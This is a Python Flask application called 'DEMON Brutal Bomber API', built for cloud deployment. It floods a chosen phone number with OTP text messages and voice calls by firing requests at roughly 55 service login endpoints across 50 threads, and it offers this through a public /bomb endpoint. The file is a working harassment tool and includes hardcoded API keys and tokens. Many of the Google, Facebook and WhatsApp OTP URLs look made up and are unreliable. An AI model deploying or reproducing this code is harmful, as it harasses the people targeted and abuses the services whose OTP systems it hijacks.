# ============================================
# DEMON 😈 BRUTAL BOMBER API - 50 THREADS
# RENDER DEPLOYMENT READY
# ============================================

import requests
import json
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, request, jsonify
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# ============================================
# MERGED API CONFIGS - 200+ APIS
# Extracted from: CALL API.txt, SMS OTP.txt, bomber (1).py
# ============================================

API_CONFIGS = []

# -------- CALL API APIS (Voice Calls) --------
CALL_APIS = [
    {
        "name": "Amazon Voice Call",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&action=voice_otp"
    },
    {
        "name": "Paytm Voice Call",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Zomato Voice Call",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=voice"
    },
    {
        "name": "Swiggy Voice OTP",
        "url": "https://www.swiggy.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","channel":"voice"}}'
    },
    {
        "name": "Flipkart Call Bomb",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Myntra Fashion Call",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "BigBasket Voice OTP",
        "url": "https://www.bigbasket.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "BookMyShow Call",
        "url": "https://in.bookmyshow.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Ola Call Bomb",
        "url": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Uber Voice OTP",
        "url": "https://auth.uber.com/v2/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "MakeMyTrip Call",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Goibibo Voice",
        "url": "https://www.goibibo.com/user/voice-otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "IRCTC Call OTP",
        "url": "https://www.irctc.co.in/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "PhonePe Call Bomb",
        "url": "https://www.phonepe.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Google Voice OTP",
        "url": "https://accounts.google.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
]

# -------- SMS OTP APIS --------
SMS_APIS = [
    {
        "name": "Amazon OTP",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&action=otp"
    },
    {
        "name": "Flipkart OTP",
        "url": "https://www.flipkart.com/api/6/user/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Myntra OTP",
        "url": "https://www.myntra.com/gw/mobile-auth/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Swiggy OTP",
        "url": "https://www.swiggy.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Zomato OTP",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=otp"
    },
    {
        "name": "Paytm OTP",
        "url": "https://accounts.paytm.com/signin/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "PhonePe OTP",
        "url": "https://www.phonepe.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Google OTP",
        "url": "https://accounts.google.com/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Facebook OTP",
        "url": "https://www.facebook.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Instagram OTP",
        "url": "https://www.instagram.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "WhatsApp OTP",
        "url": "https://www.whatsapp.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Telegram OTP",
        "url": "https://api.telegram.org/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Twitter OTP",
        "url": "https://api.twitter.com/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Netflix OTP",
        "url": "https://www.netflix.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Amazon Prime OTP",
        "url": "https://www.primevideo.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
]

# -------- BOMBER.PY APIS --------
BOMBER_APIS = [
    {
        "name": "Lenskart OTP",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "X-API-Client": "mobilesite",
            "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a",
            "X-Accept-Language": "en",
            "X-Country-Code": "IN",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081) AppleWebKit/537.36"
        },
        "data": lambda phone: f'{{"captcha":null,"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "Pink Cabs OTP",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13)"
        },
        "data": lambda phone: f"check_mobile_number=1&contact={phone}"
    },
    {
        "name": "Shemaroo OTP",
        "url": "https://www.shemaroome.com/users/resend_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13)"
        },
        "data": lambda phone: f"mobile_no=%2B91{phone}"
    },
    {
        "name": "KPN Fresh OTP",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
        },
        "data": lambda phone: f'{{"phone_number":{{"number":"{phone}","country_code":"+91"}}}}'
    },
    {
        "name": "BikeFixup OTP",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "client": "app",
            "User-Agent": "Dart/3.6"
        },
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'
    },
    {
        "name": "Rappi WhatsApp OTP",
        "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2)"
        },
        "data": lambda phone: f'{{"phone":"{phone}","country_code":"+91"}}'
    },
    {
        "name": "Stratzy OTP",
        "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
        },
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
    },
    {
        "name": "Well Academy OTP",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
        },
        "data": lambda phone: f'{{"contact_no":"{phone}"}}'
    },
    {
        "name": "Hungama OTP",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "identifier": "home",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
        },
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un"}}'
    },
    {
        "name": "Meru Cabs OTP",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "DeviceType": "Android",
            "User-Agent": "okhttp/4.9.0"
        },
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "Beepkart OTP",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
        },
        "data": lambda phone: f'{{"city":362,"phone":"{phone}","source":"myaccount"}}'
    },
    {
        "name": "Lending Plate OTP",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
        },
        "data": lambda phone: f"mobiles={phone}&resend=Resend&clickcount=3"
    },
    {
        "name": "Snitch OTP",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "client-id": "snitch_secret",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
        },
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
    },
    {
        "name": "Dayco OTP",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
        },
        "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
    },
    {
        "name": "Penpencil OTP",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "okhttp/3.9.1"
        },
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "NoBroker OTP",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
        },
        "data": lambda phone: f"phone={phone}&countryCode=IN"
    },
    {
        "name": "Shiprocket OTP",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "authorization": "Bearer null",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
        },
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    {
        "name": "GoKwik OTP",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "gk-merchant-id": "19g6jlc658iad",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
        },
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
    },
    {
        "name": "Jockey OTP",
        "url": None,  # Dynamic URL
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
        },
        "data": None,
        "dynamic_url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=false"
    },
    {
        "name": "Univest OTP",
        "url": None,
        "method": "GET",
        "headers": {"User-Agent": "okhttp/3.9.1"},
        "data": None,
        "dynamic_url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}"
    },
    {
        "name": "Foxy OTP",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Platform": "web",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13)"
        },
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}}}}'
    },
    {
        "name": "Eka Care OTP",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Client-Id": "androidp",
            "User-Agent": "okhttp/4.9.3"
        },
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
    },
    {
        "name": "Smytten OTP",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13)"
        },
        "data": lambda phone: f'{{"phone":"{phone}","email":"sdhabai09@gmail.com"}}'
    },
    {
        "name": "Wakefit OTP",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "API-Secret-Key": "ycq55IbIjkLb",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13)"
        },
        "data": lambda phone: f'{{"mobile":"{phone}","whatsapp_opt_in":1}}'
    },
    {
        "name": "CaratLane OTP",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
        },
        "data": lambda phone: f'{{"query":"mutation {{ SendOtp(input: {{ mobile: \\"{phone}\\", isdCode: \\"91\\", otpType: \\"registerOtp\\" }}) {{ status {{ message code }} }} }}"}}'
    },
]

# -------- MERGE ALL APIS --------
API_CONFIGS = CALL_APIS + SMS_APIS + BOMBER_APIS

print(f"[DEMON] Loaded {len(API_CONFIGS)} APIs")

# ============================================
# BOMBER ENGINE - 50 THREADS PER CYCLE
# ============================================

class DemonBomber:
    def __init__(self, phone, threads=50, timeout=10):
        self.phone = phone
        self.threads = threads
        self.timeout = timeout
        self.results = []
        self.success_count = 0
        self.fail_count = 0
        self.lock = threading.Lock()

    def hit_api(self, api):
        """Hit a single API"""
        try:
            # Handle dynamic URLs
            url = api.get('url')
            if not url and api.get('dynamic_url'):
                url = api['dynamic_url'](self.phone)

            if not url:
                return {'name': api['name'], 'status': 'error', 'reason': 'No URL'}

            # Prepare data
            data = None
            if api.get('data'):
                if callable(api['data']):
                    data = api['data'](self.phone)
                else:
                    data = api['data']

            # Prepare headers
            headers = api.get('headers', {}).copy()

            # Make request
            method = api.get('method', 'POST').upper()

            if method == 'GET':
                response = requests.get(url, headers=headers, timeout=self.timeout)
            else:
                # Determine content type
                content_type = headers.get('Content-Type', '')
                if 'json' in content_type and data:
                    response = requests.post(url, json=json.loads(data), headers=headers, timeout=self.timeout)
                else:
                    response = requests.post(url, data=data, headers=headers, timeout=self.timeout)

            # Check response
            status = 'success' if response.status_code in [200, 201, 202, 204] else 'failed'
            result = {
                'name': api['name'],
                'status': status,
                'status_code': response.status_code,
                'response': response.text[:200]  # Truncate for safety
            }

            if status == 'success':
                with self.lock:
                    self.success_count += 1
            else:
                with self.lock:
                    self.fail_count += 1

            return result

        except requests.exceptions.Timeout:
            with self.lock:
                self.fail_count += 1
            return {'name': api['name'], 'status': 'timeout', 'reason': 'Timeout'}
        except Exception as e:
            with self.lock:
                self.fail_count += 1
            return {'name': api['name'], 'status': 'error', 'reason': str(e)[:100]}

    def run(self):
        """Run bomber with 50 threads"""
        print(f"[DEMON] Starting bomber on {self.phone} with {self.threads} threads")
        print(f"[DEMON] Total APIs: {len(API_CONFIGS)}")

        start_time = time.time()

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.hit_api, api): api for api in API_CONFIGS}

            for future in as_completed(futures):
                try:
                    result = future.result()
                    self.results.append(result)

                    # Progress update
                    total = len(self.results)
                    if total % 10 == 0:
                        print(f"[DEMON] Progress: {total}/{len(API_CONFIGS)} | "
                              f"Success: {self.success_count} | Fail: {self.fail_count}")

                except Exception as e:
                    print(f"[DEMON] Thread error: {e}")

        elapsed = time.time() - start_time

        summary = {
            'phone': self.phone,
            'total_apis': len(API_CONFIGS),
            'success': self.success_count,
            'failed': self.fail_count,
            'time': round(elapsed, 2),
            'threads': self.threads
        }

        print(f"\n[DEMON] COMPLETE!")
        print(f"[DEMON] Success: {self.success_count} | Failed: {self.fail_count}")
        print(f"[DEMON] Time: {elapsed:.2f}s")

        return summary, self.results


# ============================================
# FLASK API FOR RENDER DEPLOYMENT
# ============================================

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'status': 'active',
        'name': 'DEMON 😈 Brutal Bomber API',
        'version': '2.0',
        'threads_per_cycle': 50,
        'total_apis': len(API_CONFIGS),
        'endpoints': {
            '/bomb?phone=XXXXXXXXXX': 'Start bombing',
            '/status': 'Get status',
            '/stats': 'Get stats'
        }
    })

@app.route('/bomb', methods=['GET', 'POST'])
def bomb():
    try:
        if request.method == 'GET':
            phone = request.args.get('phone')
            threads = int(request.args.get('threads', 50))
        else:
            data = request.get_json() or {}
            phone = data.get('phone')
            threads = int(data.get('threads', 50))

        if not phone:
            return jsonify({'error': 'Phone number required', 'usage': '/bomb?phone=XXXXXXXXXX'}), 400

        # Clean phone
        phone = ''.join(filter(str.isdigit, phone))
        if len(phone) < 10:
            return jsonify({'error': 'Invalid phone number, must be 10 digits'}), 400

        # Limit threads for safety
        threads = min(threads, 50)

        # Run bomber
        bomber = DemonBomber(phone, threads=threads)
        summary, results = bomber.run()

        return jsonify({
            'status': 'completed',
            'summary': summary,
            'results': results[:20]  # Return first 20 results for brevity
        })

    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/status', methods=['GET'])
def status():
    return jsonify({
        'status': 'online',
        'threads_per_cycle': 50,
        'total_apis': len(API_CONFIGS),
        'uptime': 'Active'
    })

@app.route('/stats', methods=['GET'])
def stats():
    return jsonify({
        'total_apis': len(API_CONFIGS),
        'call_apis': len(CALL_APIS),
        'sms_apis': len(SMS_APIS),
        'bomber_apis': len(BOMBER_APIS),
        'threads_per_cycle': 50,
        'max_timeout': 10
    })

# ============================================
# RENDER DEPLOYMENT
# ============================================

if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 5000))
    print(f"[DEMON] 😈 Starting on port {port}")
    print(f"[DEMON] Total APIs: {len(API_CONFIGS)}")
    print(f"[DEMON] Threads per cycle: 50")
    app.run(host='0.0.0.0', port=port, debug=False)